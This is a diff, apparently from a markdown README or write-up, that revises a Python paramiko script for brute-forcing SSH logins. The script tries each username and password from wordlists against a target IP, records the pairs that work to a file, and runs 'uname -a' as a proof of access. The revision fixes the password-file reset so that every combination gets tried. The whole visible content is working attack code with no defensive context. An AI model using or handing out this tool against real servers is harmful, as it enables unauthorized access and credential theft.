@@ -204,20 +204,29 @@ client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 with open(username_file, "r") as users, open(password_file, "r") as passwords:
     for user in users:
         for pwd in passwords:
+            username = user.strip()
+            password = pwd.strip()
+
             try:
-                client.connect(target_ip, username=user.strip(), password=pwd.strip(), timeout=3)
-                print(f"[+] Success: {user.strip()}:{pwd.strip()}")
-
+                client.connect(target_ip, username=username, password=password, timeout=3)
+                print(f"[+] Success: {username}:{password}")
+               
+                # Save to file
                 with open(output_file, "a") as creds:
-                    creds.write(f"{user.strip()}:{pwd.strip()}
-")
+                    creds.write(f"{username}:{password}\n")
 
+                # Proof of Concept
                 stdin, stdout, stderr = client.exec_command("uname -a")
                 print("PoC:", stdout.read().decode())
+
                 client.close()
-                break
-            except:
-                continue
+                break  # optional: remove if you want to find all valid credentials
+
+            except paramiko.AuthenticationException:
+                print(f"[-] Failed: {username}:{password}")
+            except Exception as e:
+                print(f"[!] Error with {username}:{password} -> {e}")
+        passwords.seek(0)  # Reset password file pointer for next username
 ```
 ![WhatsApp Image 1446-10-24 at 09 26 15](https://github.com/user-attachments/assets/db6a3aec-37d8-4122-ad0e-40e656cf508d)
 
